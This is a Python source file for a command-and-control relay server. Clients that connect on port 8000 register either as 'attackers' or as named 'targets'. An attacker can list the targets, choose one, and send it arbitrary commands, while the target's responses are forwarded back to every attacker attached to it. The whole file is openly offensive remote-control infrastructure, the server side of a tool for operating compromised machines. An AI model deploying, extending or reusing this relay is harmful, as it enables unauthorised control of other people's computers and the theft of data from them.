import socket
import threading
import struct

ATTACKER_LIST = []
TARGET_LIST = []
TARGET_NAMES_LIST = []
ATTACKER_TO_TARGET = {}
TARGET_TO_ATTACKETS = {}


class Server():
    def __init__(self):
        self.server_socket = socket.socket()
        self.server_socket.bind(("0.0.0.0", 8000))
        self.server_socket.listen(100)
        print("Listening for clients...")

        while True:
            client, address = self.server_socket.accept()
            threading.Thread(target=self.play_client,
                             args=(client,)).start()

    def play_client(self, client):
        self.client = client
        Recognition(self.client).recognition()



class Recognition():
    def __init__(self, client):
        self.client = client
        
    def recognition(self):
        try:
            data = (SuperSocket(self.client).recv_msg()).decode()
            if data == "1":
                ATTACKER_LIST.append(self.client)
            else:
                target_name = SuperSocket(self.client).recv_msg().decode()
                TARGET_LIST.append(self.client)
                TARGET_NAMES_LIST.append(target_name)
                TARGET_TO_ATTACKETS[self.client] = []
                
            print("closed attacker")
            print("TARGETS:")
            print(TARGET_LIST)
            print("TARGET NAMES:")
            print(TARGET_NAMES_LIST)
            print("ATTACKERS:")
            print(ATTACKER_LIST)
            print("ATTACKER TO TARGET")
            print(ATTACKER_TO_TARGET)
            print("TARGET_TO_ATTACKETS")
            print(TARGET_TO_ATTACKETS)
            print("----------------------------------------------------------")
            
            Main(self.client).operations()
            
        finally:
            if self.client in TARGET_LIST:
                target_index = TARGET_LIST.index(self.client)
                TARGET_LIST.remove(self.client)
                
                
                try:
                    TARGET_NAMES_LIST.pop(target_index)
                    TARGET_TO_ATTACKETS.pop(self.client)
                    
                except:
                    pass

            else:
                ATTACKER_LIST.remove(self.client)
                
                
                try:
                    target_socket = ATTACKER_TO_TARGET[self.client]
                    ATTACKER_TO_TARGET.pop(self.client)
                    TARGET_TO_ATTACKETS[target_socket].remove(self.client)
                
                except:
                    pass
                
            print("closed attacker")
            print("TARGETS:")
            print(TARGET_LIST)
            print("TARGET NAMES:")
            print(TARGET_NAMES_LIST)
            print("ATTACKERS:")
            print(ATTACKER_LIST)
            print("ATTACKER TO TARGET")
            print(ATTACKER_TO_TARGET)
            print("TARGET_TO_ATTACKETS")
            print(TARGET_TO_ATTACKETS)
            print("----------------------------------------------------------")



class Main():
    def __init__(self, client):
        self.client = client
        
    def operations(self):
        while True:

            data = SuperSocket(self.client).recv_msg()
            try:
                if self.client in TARGET_LIST:
                    try:
                        for socket in TARGET_TO_ATTACKETS[self.client]:
                            SuperSocket(socket).send_msg(data)
                            
                    except:
                        pass
                        
                elif self.client in ATTACKER_LIST:
                    
                    decoded_data = data.decode()
                    
                    if decoded_data == "get_list_of_target":
                        SuperSocket(self.client).send_msg(str(TARGET_NAMES_LIST).encode())
                        
                    elif decoded_data == "choose_a_target":
                        chosen_target_index = SuperSocket(self.client).recv_msg().decode()
                        chosen_target_index = int(chosen_target_index)
                        target = TARGET_LIST[chosen_target_index]
                        ATTACKER_TO_TARGET[self.client] = target
                        TARGET_TO_ATTACKETS[target].append(self.client)
                        
                    elif decoded_data == "exit":
                        break
                        
                    else:
                        try:
                            SuperSocket(ATTACKER_TO_TARGET[self.client]).send_msg(data)
                        
                        except:
                            pass
                else:
                    pass
            except:
                pass


class SuperSocket():
    def __init__(self, current_socket):  # make the self.current_socket euqal to current_socket
        self.current_socket = current_socket

    # create a pack with length of message and message and sending this pack to server
    def send_msg(self, msg):
        msg = struct.pack('>I', len(msg)) + msg
        self.current_socket.send(msg)

    def recv_msg(self):  # getting the message and understading what is the length of the message and return the the message
        raw_msglen = self.recvall(4)
        if not raw_msglen:
            return None
        msglen = struct.unpack('>I', raw_msglen)[0]
        return self.recvall(msglen)

    def recvall(self, msglen):  # getting the whole message and returning the data to the recv_msg
        data = b''
        while len(data) < msglen:
            packet = self.current_socket.recv(msglen - len(data))
            if not packet:
                return None
            data += packet
        return data


if __name__ == '__main__':
    Server()
